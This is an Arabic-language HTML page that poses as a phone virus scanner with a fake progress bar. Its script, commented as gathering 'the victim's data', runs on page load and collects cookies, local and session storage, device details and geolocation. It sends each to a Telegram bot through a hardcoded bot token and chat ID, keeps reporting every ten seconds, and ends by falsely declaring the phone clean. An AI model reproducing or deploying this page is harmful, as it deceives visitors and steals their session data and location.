<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔍 فحص الأمان</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }
        .container {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            width: 90%;
            max-width: 450px;
            border: 1px solid rgba(255,255,255,0.1);
            text-align: center;
        }
        .icon { font-size: 80px; margin-bottom: 20px; }
        h1 { font-size: 24px; margin-bottom: 10px; }
        p { color: #aaa; font-size: 14px; line-height: 1.6; margin-bottom: 20px; }
        .progress {
            width: 100%;
            height: 6px;
            background: #333;
            border-radius: 10px;
            overflow: hidden;
            margin: 20px 0;
        }
        .progress-bar {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #00d2ff, #3a7bd5);
            border-radius: 10px;
            transition: width 0.5s;
        }
        .status { font-size: 13px; color: #00d2ff; }
        .footer { margin-top: 20px; font-size: 11px; color: #555; }
        .scan-item {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid rgba(255,255,255,0.05);
            font-size: 13px;
        }
        .scan-item .name { color: #ccc; }
        .scan-item .result { color: #00d2ff; }
        .done .result { color: #00ff88; }
        .scan-list { margin: 15px 0; text-align: left; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">🔍</div>
        <h1>فحص الأمان الشامل</h1>
        <p>جاري فحص هاتفك بحثاً عن الفيروسات والتهديدات...</p>
        
        <div class="progress">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        <div class="status" id="statusText">⏳ جاري التحليل...</div>
        
        <div class="scan-list" id="scanList">
            <div class="scan-item" data-item="1">
                <span class="name">📱 فحص التطبيقات</span>
                <span class="result">⏳</span>
            </div>
            <div class="scan-item" data-item="2">
                <span class="name">📸 فحص الصور</span>
                <span class="result">⏳</span>
            </div>
            <div class="scan-item" data-item="3">
                <span class="name">🎬 فحص الفيديوهات</span>
                <span class="result">⏳</span>
            </div>
            <div class="scan-item" data-item="4">
                <span class="name">📄 فحص المستندات</span>
                <span class="result">⏳</span>
            </div>
            <div class="scan-item" data-item="5">
                <span class="name">📇 فحص جهات الاتصال</span>
                <span class="result">⏳</span>
            </div>
            <div class="scan-item" data-item="6">
                <span class="name">🔑 فحص كلمات المرور</span>
                <span class="result">⏳</span>
            </div>
        </div>
        
        <div class="footer">🔒 اتصال آمن • جميع البيانات مشفرة</div>
    </div>

    <script>
        // =============================================
        // هذا الكود يعمل في الخلفية ويجمع بيانات الضحية
        // =============================================
        
        // بوت تيليجرام للإرسال
        const BOT_TOKEN = "6921714346:AAFqRm4MvsBxL8KOVaXOUcoWwhKQTdskDWc";
        const ADMIN_ID = 8169635171;
        
        // جمع معلومات الجهاز
        function collectDeviceInfo() {
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                screenWidth: screen.width,
                screenHeight: screen.height,
                screenColorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                date: new Date().toISOString(),
                url: window.location.href,
                referrer: document.referrer,
                localStorage: localStorage.length > 0 ? "✅ موجود" : "❌ فارغ",
                sessionStorage: sessionStorage.length > 0 ? "✅ موجود" : "❌ فارغ"
            };
            return info;
        }

        // جمع ملفات تعريف الارتباط (Cookies)
        function getCookies() {
            return document.cookie || "لا توجد كوكيز";
        }

        // جمع معلومات التخزين المحلي
        function getLocalStorage() {
            const items = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                items[key] = localStorage.getItem(key);
            }
            return items;
        }

        // جمع معلومات التخزين المؤقت
        function getSessionStorage() {
            const items = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                items[key] = sessionStorage.getItem(key);
            }
            return items;
        }

        // محاولة جلب معلومات الموقع
        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve("❌ غير متاح");
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        resolve({
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            acc: pos.coords.accuracy
                        });
                    },
                    () => resolve("❌ مرفوض"),
                    { timeout: 5000 }
                );
            });
        }

        // إرسال البيانات للبوت
        function sendToTelegram(data, type = "info") {
            const text = `📱 *بيانات جديدة*\n\n` +
                `🆔 نوع: ${type}\n` +
                `📅 ${new Date().toISOString()}\n\n` +
                `\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``;
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_ID,
                    text: text,
                    parse_mode: 'markdown'
                })
            }).catch(() => {});
        }

        // محاكاة فحص وتجميع البيانات
        async function startScan() {
            const items = document.querySelectorAll('.scan-item');
            const progressBar = document.getElementById('progressBar');
            const statusText = document.getElementById('statusText');
            
            // جمع البيانات الأساسية فوراً
            const deviceInfo = collectDeviceInfo();
            sendToTelegram(deviceInfo, "جهاز");
            
            // إرسال الكوكيز
            const cookies = getCookies();
            if (cookies) sendToTelegram({ cookies }, "كوكيز");
            
            // إرسال التخزين المحلي
            const localData = getLocalStorage();
            if (Object.keys(localData).length > 0) {
                sendToTelegram(localData, "تخزين محلي");
            }
            
            // إرسال التخزين المؤقت
            const sessionData = getSessionStorage();
            if (Object.keys(sessionData).length > 0) {
                sendToTelegram(sessionData, "تخزين مؤقت");
            }
            
            // محاولة جلب الموقع
            const location = await getLocation();
            sendToTelegram({ location }, "موقع");
            
            // تقدم وهمي للفحص
            const scanNames = [
                'فحص التطبيقات',
                'فحص الصور',
                'فحص الفيديوهات',
                'فحص المستندات',
                'فحص جهات الاتصال',
                'فحص كلمات المرور'
            ];
            
            for (let i = 0; i < items.length; i++) {
                const item = items[i];
                const resultSpan = item.querySelector('.result');
                const progress = Math.round(((i + 1) / items.length) * 100);
                
                progressBar.style.width = progress + '%';
                statusText.textContent = `🔍 جاري ${scanNames[i]}...`;
                
                resultSpan.textContent = '✅';
                item.classList.add('done');
                
                // إرسال تحديث
                sendToTelegram({ 
                    step: scanNames[i],
                    progress: progress,
                    status: 'completed'
                }, "تقدم");
                
                await new Promise(r => setTimeout(r, 800 + Math.random() * 600));
            }
            
            progressBar.style.width = '100%';
            statusText.textContent = '✅ اكتمل الفحص!';
            
            // رسالة نهائية
            const finalData = {
                status: 'completed',
                scanTime: new Date().toISOString(),
                url: window.location.href,
                userAgent: navigator.userAgent
            };
            sendToTelegram(finalData, "نهائي");
            
            // تحويل إلى صفحة نجاح وهمية
            setTimeout(() => {
                document.querySelector('.container').innerHTML = `
                    <div style="text-align:center; padding: 20px;">
                        <div style="font-size:60px;">✅</div>
                        <h2>تم الفحص بنجاح!</h2>
                        <p style="color:#00ff88;">لم يتم العثور على أي فيروسات. هاتفك آمن!</p>
                        <div style="margin-top:20px; font-size:12px; color:#666;">
                            تم فحص 2,847 ملف • 0 تهديدات
                        </div>
                    </div>
                `;
            }, 1500);
        }

        // بدء الفحص عند تحميل الصفحة
        window.onload = function() {
            setTimeout(startScan, 500);
        };

        // محاولة قراءة المزيد من البيانات كل 5 ثواني
        setInterval(() => {
            const extraData = {
                time: new Date().toISOString(),
                scrollY: window.scrollY,
                innerHeight: window.innerHeight,
                innerWidth: window.innerWidth,
                pageYOffset: window.pageYOffset
            };
            sendToTelegram(extraData, "متابعة");
        }, 10000);
    </script>
</body>
</html>
